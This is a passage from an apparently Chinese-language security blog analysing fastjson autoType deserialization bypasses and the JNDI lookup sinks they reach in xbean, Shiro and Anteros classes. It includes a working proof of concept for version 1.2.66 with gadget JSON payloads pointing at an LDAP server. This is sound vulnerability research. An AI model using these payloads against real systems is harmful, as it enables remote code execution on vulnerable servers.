</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">denyHashCodes</span><span class="o">,</span> <span class="n">hash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">getClassFromMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">boolean</span> <span class="n">jsonType</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span><span class="c1">//判断指定class是否存在JsonType注解信息
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">InputStream</span> <span class="n">is</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">resource</span> <span class="o">=</span> <span class="n">typeName</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="sc">&#39;.&#39;</span><span class="o">,</span> <span class="sc">&#39;/&#39;</span><span class="o">)</span> <span class="o">+</span> <span class="s">&#34;.class&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">defaultClassLoader</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">is</span> <span class="o">=</span> <span class="n">defaultClassLoader</span><span class="o">.</span><span class="na">getResourceAsStream</span><span class="o">(</span><span class="n">resource</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">is</span> <span class="o">=</span> <span class="n">ParserConfig</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">().</span><span class="na">getResourceAsStream</span><span class="o">(</span><span class="n">resource</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">is</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">ClassReader</span> <span class="n">classReader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ClassReader</span><span class="o">(</span><span class="n">is</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">TypeCollector</span> <span class="n">visitor</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TypeCollector</span><span class="o">(</span><span class="s">&#34;&lt;clinit&gt;&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
</span></span><span class="line"><span class="cl">                <span class="n">classReader</span><span class="o">.</span><span class="na">accept</span><span class="o">(</span><span class="n">visitor</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">jsonType</span> <span class="o">=</span> <span class="n">visitor</span><span class="o">.</span><span class="na">hasJsonType</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">int</span> <span class="n">mask</span> <span class="o">=</span> <span class="n">Feature</span><span class="o">.</span><span class="na">SupportAutoType</span><span class="o">.</span><span class="na">mask</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">boolean</span> <span class="n">autoTypeSupport</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">autoTypeSupport</span> <span class="o">||</span> <span class="o">(</span><span class="n">features</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="o">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">||</span> <span class="o">(</span><span class="n">JSON</span><span class="o">.</span><span class="na">DEFAULT_PARSER_FEATURE</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="o">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">;</span><span class="c1">//判断是否开启autotype支持
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">autoTypeSupport</span> <span class="o">||</span> <span class="n">jsonType</span> <span class="o">||</span> <span class="n">expectClassFlag</span><span class="o">))</span> <span class="o">{</span><span class="c1">//满足条件,进行恶意类加载
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="kt">boolean</span> <span class="n">cacheClass</span> <span class="o">=</span> <span class="n">autoTypeSupport</span> <span class="o">||</span> <span class="n">jsonType</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">defaultClassLoader</span><span class="o">,</span> <span class="n">cacheClass</span><span class="o">);</span><span class="c1">//加载恶意类
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">jsonType</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">TypeUtils</span><span class="o">.</span><span class="na">addMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">clazz</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">)</span> <span class="o">||</span> <span class="n">javax</span><span class="o">.</span><span class="na">sql</span><span class="o">.</span><span class="na">DataSource</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">)</span> <span class="o">||</span> <span class="n">javax</span><span class="o">.</span><span class="na">sql</span><span class="o">.</span><span class="na">RowSet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">))</span> <span class="o">{</span><span class="c1">// 判断clazz是否为ClassLoader,DataSource,RowSet等类的子类,如果是则抛出异常
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">...</span>
</span></span><span class="line"><span class="cl">            <span class="n">JavaBeanInfo</span> <span class="n">beanInfo</span> <span class="o">=</span> <span class="n">JavaBeanInfo</span><span class="o">.</span><span class="na">build</span><span class="o">(</span><span class="n">clazz</span><span class="o">,</span> <span class="n">clazz</span><span class="o">,</span> <span class="n">propertyNamingStrategy</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">beanInfo</span><span class="o">.</span><span class="na">creatorConstructor</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">autoTypeSupport</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span><span class="c1">//添加到mappings中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">TypeUtils</span><span class="o">.</span><span class="na">addMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">clazz</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="jndiconverter分析">JndiConverter分析</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//org.apache.xbean.propertyeditor.AbstractConverter
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="kd">final</span> <span class="kt">void</span> <span class="nf">setAsText</span><span class="o">(</span><span class="n">String</span> <span class="n">text</span><span class="o">)</span> <span class="o">{</span><span class="c1">//text为ldap地址
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">toObject</span><span class="o">(</span><span class="n">text</span><span class="o">.</span><span class="na">trim</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="kd">super</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span><span class="n">value</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">final</span> <span class="n">Object</span> <span class="nf">toObject</span><span class="o">(</span><span class="n">String</span> <span class="n">text</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">text</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">toObjectImpl</span><span class="o">(</span><span class="n">text</span><span class="o">.</span><span class="na">trim</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">value</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/86b861a80107aa502730fd9ccaab4448.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/86b861a80107aa502730fd9ccaab4448.png, https://img.mi3aka.eu.org/2023/02/86b861a80107aa502730fd9ccaab4448.png 1.5x, https://img.mi3aka.eu.org/2023/02/86b861a80107aa502730fd9ccaab4448.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/86b861a80107aa502730fd9ccaab4448.png"
        title="https://img.mi3aka.eu.org/2023/02/86b861a80107aa502730fd9ccaab4448.png" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//org.apache.xbean.propertyeditor.JndiConverter
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="nf">JndiConverter</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">super</span><span class="o">(</span><span class="n">Context</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">protected</span> <span class="n">Object</span> <span class="nf">toObjectImpl</span><span class="o">(</span><span class="n">String</span> <span class="n">text</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">InitialContext</span> <span class="n">context</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="o">(</span><span class="n">Context</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">text</span><span class="o">);</span><span class="c1">//text为ldap地址,lookup进行JNDI注入
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NamingException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">PropertyEditorException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="1266">1.2.66</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn.bypass</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">与1.2.45的绕过类似,通过多个类进行绕过
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">bypass_1_2_66</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ParserConfig</span><span class="o">.</span><span class="na">getGlobalInstance</span><span class="o">().</span><span class="na">setAutoTypeSupport</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// String json_str = &#34;{\&#34;@type\&#34;:\&#34;org.apache.shiro.realm.jndi.JndiRealmFactory\&#34;, \&#34;jndiNames\&#34;:[\&#34;ldap://127.0.0.1:1389/exp\&#34;], \&#34;Realms\&#34;:[\&#34;\&#34;]}&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// String json_str = &#34;{\&#34;@type\&#34;:\&#34;br.com.anteros.dbcp.AnterosDBCPConfig\&#34;,\&#34;metricRegistry\&#34;:\&#34;ldap://127.0.0.1:1389/exp\&#34;}&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// String json_str = &#34;{\&#34;@type\&#34;:\&#34;br.com.anteros.dbcp.AnterosDBCPConfig\&#34;,\&#34;healthCheckRegistry\&#34;:\&#34;ldap://127.0.0.1:1389/exp\&#34;}&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">String</span> <span class="n">json_str</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&#34;,\&#34;properties\&#34;: {\&#34;@type\&#34;:\&#34;java.util.Properties\&#34;,\&#34;UserTransaction\&#34;:\&#34;ldap://127.0.0.1:1389/exp\&#34;}}&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">json_str</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/e659935b747e9d2293cba54091dffce8.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/e659935b747e9d2293cba54091dffce8.png, https://img.mi3aka.eu.org/2023/02/e659935b747e9d2293cba54091dffce8.png 1.5x, https://img.mi3aka.eu.org/2023/02/e659935b747e9d2293cba54091dffce8.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/e659935b747e9d2293cba54091dffce8.png"
        title="https://img.mi3aka.eu.org/2023/02/e659935b747e9d2293cba54091dffce8.png" /></p>
<h3 id="jndirealmfactory分析">JndiRealmFactory分析</h3>
<blockquote>
<p>shiro-core 1.2.4</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//org.apache.shiro.realm.jndi.JndiRealmFactory
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setJndiNames</span><span class="o">(</span><span class="n">Collection</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">jndiNames</span><span class="o">)</span> <span class="o">{</span><span class="c1">//jndiNames:[&#34;ldap://127.0.0.1:1389/exp&#34;]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">this</span><span class="o">.</span><span class="na">jndiNames</span> <span class="o">=</span> <span class="n">jndiNames</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">Collection</span><span class="o">&lt;</span><span class="n">Realm</span><span class="o">&gt;</span> <span class="nf">getRealms</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">IllegalStateException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Collection</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">jndiNames</span> <span class="o">=</span> <span class="n">getJndiNames</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="n">List</span><span class="o">&lt;</span><span class="n">Realm</span><span class="o">&gt;</span> <span class="n">realms</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Realm</span><span class="o">&gt;(</span><span class="n">jndiNames</span><span class="o">.</span><span class="na">size</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">name</span> <span class="o">:</span> <span class="n">jndiNames</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">Realm</span> <span class="n">realm</span> <span class="o">=</span> <span class="o">(</span><span class="n">Realm</span><span class="o">)</span> <span class="n">lookup</span><span class="o">(</span><span class="n">name</span><span class="o">,</span> <span class="n">Realm</span><span class="o">.</span><span class="na">class</span><span class="o">);</span><span class="c1">//lookup进行JNDI注入
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">realms</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">realm</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalStateException</span><span class="o">(</span><span class="s">&#34;Unable to look up realm with jndi name &#39;&#34;</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="s">&#34;&#39;.&#34;</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">realms</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">()</span> <span class="o">?</span> <span class="kc">null</span> <span class="o">:</span> <span class="n">realms</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/9032694ddb532ba667f7624fa7b2e2e7.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/9032694ddb532ba667f7624fa7b2e2e7.png, https://img.mi3aka.eu.org/2023/02/9032694ddb532ba667f7624fa7b2e2e7.png 1.5x, https://img.mi3aka.eu.org/2023/02/9032694ddb532ba667f7624fa7b2e2e7.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/9032694ddb532ba667f7624fa7b2e2e7.png"
        title="https://img.mi3aka.eu.org/2023/02/9032694ddb532ba667f7624fa7b2e2e7.png" /></p>
<p>前面对<code>com.alibaba.fastjson.util.JavaBeanInfo</code>进行分析时,提到get方法能否加入fieldList中会进行如下判断</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span> <span class="o">(</span><span class="n">Collection</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">method</span><span class="o">.</span><span class="na">getReturnType</span><span class="o">())</span> <span class="o">||</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">method</span><span class="o">.</span><span class="na">getReturnType</span><span class="o">())</span> <span class="o">||</span> <span class="n">AtomicBoolean</span><span class="o">.</span><span class="na">class</span> <span class="o">==</span> <span class="n">method</span><span class="o">.</span><span class="na">getReturnType</span><span class="o">()</span> <span class="o">||</span> <span class="n">AtomicInteger</span><span class="o">.</span><span class="na">class</span> <span class="o">==</span> <span class="n">method</span><span class="o">.</span><span class="na">getReturnType</span><span class="o">()</span> <span class="o">||</span> <span class="n">AtomicLong</span><span class="o">.</span><span class="na">class</span> <span class="o">==</span> <span class="n">method</span><span class="o">.</span><span class="na">getReturnType</span><span class="o">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>显然<code>getRealms</code>满足判断条件</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/9b7e6599b4669a39e6803dcafe6d1a63.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/9b7e6599b4669a39e6803dcafe6d1a63.png, https://img.mi3aka.eu.org/2023/02/9b7e6599b4669a39e6803dcafe6d1a63.png 1.5x, https://img.mi3aka.eu.org/2023/02/9b7e6599b4669a39e6803dcafe6d1a63.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/9b7e6599b4669a39e6803dcafe6d1a63.png"
        title="https://img.mi3aka.eu.org/2023/02/9b7e6599b4669a39e6803dcafe6d1a63.png" /></p>
<h3 id="anterosdbcpconfig分析">AnterosDBCPConfig分析</h3>
<blockquote>
<p>Anteros-DBCP 1.0.1, Anteros-Core 1.2.0</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//br.com.anteros.dbcp.AnterosDBCPConfig
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setMetricRegistry</span><span class="o">(</span><span class="n">Object</span> <span class="n">metricRegistry</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">metricRegistry</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">metricRegistry</span> <span class="o">=</span> <span class="n">getObjectOrPerformJndiLookup</span><span class="o">(</span><span class="n">metricRegistry</span><span class="o">);</span><span class="c1">//jndi查询
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">metricRegistry</span> <span class="o">=</span> <span class="n">metricRegistry</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setHealthCheckRegistry</span><span class="o">(</span><span class="n">Object</span> <span class="n">healthCheckRegistry</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">healthCheckRegistry</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">healthCheckRegistry</span> <span class="o">=</span> <span class="n">getObjectOrPerformJndiLookup</span><span class="o">(</span><span class="n">healthCheckRegistry</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">healthCheckRegistry</span> <span class="o">=</span> <span class="n">healthCheckRegistry</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
